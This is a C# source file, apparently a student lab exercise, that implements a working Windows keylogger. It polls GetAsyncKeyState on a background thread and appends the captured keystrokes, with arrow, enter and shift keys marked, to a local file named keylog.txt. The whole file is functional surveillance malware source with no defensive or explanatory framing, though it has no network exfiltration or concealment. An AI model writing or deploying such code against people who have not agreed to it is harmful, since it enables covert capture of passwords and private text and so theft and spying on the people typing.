using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace CSLaba4
{
    class Program
    {
        static void Main(string[] args)
        {
            KeyLogger kl = new KeyLogger();
            Thread t = new Thread(new ThreadStart(kl.ReadKeys));
            t.Start(); 
        }  
    }


    class KeyLogger
    {

        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(int i);
        private bool isLogging = true;

        public bool IsLogging { get => isLogging; set => isLogging = value; }

        
        public void ReadKeys()
        {
            string buffer = "";
            while (isLogging)
            {
                for (int i = 8; i < 190; i++)
                {
                    int keyPressed = GetAsyncKeyState(i);

                    if(keyPressed != 0)
                    switch (i)
                    {
                        case 37:
                                buffer += " <- ";
                            break;
                        case 38:
                                buffer += " |^ ";
                            break;
                        case 39:
                                buffer += "->";
                            break;
                        case 40:
                                buffer += " v| ";
                             break;
                        case 13:
                                buffer += "enter";
                                break;
                        case 16:
                        case 160:
                                buffer += "shift";
                                break;
                       default:
                                buffer += (char)i;
                       break;
                    }
                }
                Thread.Sleep(100);

                if (buffer.Length >= 32)
                {
                    SaveData("keylog.txt",buffer);
                    buffer = "";
                }
            }
        }

        public void SaveData(string path,string data)
        {
            if(!File.Exists(path)) File.WriteAllText(path,data);
            else File.AppendAllText(path,data);
        }
    
    }
}
